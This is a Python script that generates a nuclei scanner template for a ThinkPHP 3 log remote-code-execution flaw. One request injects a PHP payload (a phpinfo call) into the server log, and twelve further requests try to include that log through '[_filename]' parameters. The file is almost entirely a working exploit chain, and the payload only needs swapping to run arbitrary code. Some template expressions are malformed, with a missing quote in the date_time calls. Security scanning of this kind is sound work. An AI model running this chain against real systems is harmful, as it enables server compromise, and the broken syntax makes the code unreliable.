from nuclei import BaseHTTP,RawHTTP,Template
http1 = RawHTTP()
http1.set_raw(
"""GET /?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1
Host: {{Hostname}}
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: close
"""
)

http = BaseHTTP(method="GET")
http.set_paths(
    paths=[
        '{{BaseURL}}/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&info[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&param[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&name[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&array[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&arr[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&list[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&page[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&menus[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&var[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&data[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
        '{{BaseURL}}/?m=Home&c=Index&a=index&module[_filename]=./Application/Runtime/Logs/Home/{{substr("{{date_time("%Y")}}",2,4)}}_{{date_time(%M_%D")}}.log',
    ]
)
http.set_body_word_matcher(
    patterns=[
        "PHP Version"
    ]
)
t = Template(id="tp3_log_rce")
t.set_http(http=http1)
t.set_http(http=http)
t.finger = [
    "thinkphp"
]
t.dump()